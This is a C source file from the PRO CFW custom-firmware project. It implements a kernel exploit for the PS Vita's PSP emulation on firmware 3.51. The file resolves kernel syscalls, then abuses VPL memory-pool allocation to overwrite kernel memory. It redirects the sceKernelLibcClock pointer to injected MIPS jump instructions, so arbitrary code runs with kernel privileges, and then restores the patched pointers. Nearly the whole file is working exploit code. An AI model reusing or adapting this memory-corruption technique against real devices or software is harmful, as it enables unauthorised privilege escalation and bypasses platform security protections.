/*
 * This file is part of PRO CFW.

 * PRO CFW is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * PRO CFW is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with PRO CFW. If not, see <http://www.gnu.org/licenses/ .
 */

#include <sdk.h>
#include <psploadexec.h>
#include <psploadexec_kernel.h>
#include <psputility_modules.h>
#include <module2.h>
#include <lflash0.h>
#include <rebootconfig.h>
#include <systemctrl_se.h>
#include <string.h>
#include <kxploit.h>
#include <functions.h>

int is_exploited;
u32 sw_address = 0x88014B00;

SceUID (* _sceKernelCreateVpl)(const char *name, int part, int attr, unsigned int size, struct SceKernelVplOptParam *opt);
int (* _sceKernelTryAllocateVpl)(SceUID uid, unsigned int size, void **data);
int (* _sceKernelFreeVpl)(SceUID uid, void *data);
int (* _sceKernelDeleteVpl)(SceUID uid);
void (* _sceKernelLibcClock)() = NULL;

char buf[0x4000];

int doExploit(){
	return 0;
}

void repairInstruction(void){
	
	//Vita 3.51, restore sceKernelLibcClock and sceKernelLibcTime pointers.
	u32 rtc = g_tbl->FindTextAddrByName("sceRTC_Service");
	_sw(rtc + 0x3904, sw_address);
	_sw(rtc + 0x3924, sw_address + 4);
}

int stubScanner(){
	
	p5_open_savedata(PSP_UTILITY_SAVEDATA_AUTOLOAD);
	
	_sceKernelCreateVpl = (void *)g_tbl->RelocSyscall(g_tbl->FindImportVolatileRam("ThreadManForUser", 0x56C039B5));
	_sceKernelTryAllocateVpl = (void *)g_tbl->RelocSyscall(g_tbl->FindImportVolatileRam("ThreadManForUser", 0xAF36D708));
	_sceKernelFreeVpl = (void *)g_tbl->RelocSyscall(g_tbl->FindImportVolatileRam("ThreadManForUser", 0xB736E9FF));
	_sceKernelDeleteVpl = (void *)g_tbl->RelocSyscall(g_tbl->FindImportVolatileRam("ThreadManForUser", 0x89B3D48C));
	_sceKernelLibcClock = (void *)g_tbl->RelocSyscall(g_tbl->FindImportVolatileRam("UtilsForUser", 0x91E4F6A7));
	
	p5_close_savedata();
}

void executeKernel(u32 kernelContentFunction){
	is_exploited = 0;

	

	SceUID vpl = _sceKernelCreateVpl("kexploit", 2, 1, 512, NULL);

	_sceKernelTryAllocateVpl(vpl, 256, (void *)0x08801000);

	u32 addr1 = (*(u32*)0x08801000 + 0x100);
	u32 addr2 = *(u32*)addr1;

	_sceKernelFreeVpl(vpl, (void *)0x08801000);
	_sceKernelDeleteVpl(vpl);

	vpl = _sceKernelCreateVpl("kexploit", 2, 1, 512, NULL);

	_sw(((sw_address - addr2) + 0x108) / 8, addr2 + 4);

	_sceKernelTryAllocateVpl(vpl, 256, (void *)0x08801000);

	u32 jumpto = addr2 - 16;

	_sw(MAKE_JUMP(0x10000), jumpto);
	_sw(0, jumpto + 4);

	u32 kfuncaddr = (u32)kernelContentFunction | 0x80000000;

	_sw(0x3C020000 | (kfuncaddr >> 16), 0x10000);		//lui	$v0, %high(KernelContent)
	_sw(0x34420000 | (kfuncaddr & 0xFFFF), 0x10004);	//ori	$v0, $v0, %low(KernelContent)
	_sw(0x00400008, 0x10008);				//jr	$v0
	_sw(0, 0x1000C);					//nop

	g_tbl->KernelDcacheWritebackAll();

	_sceKernelLibcClock();
}
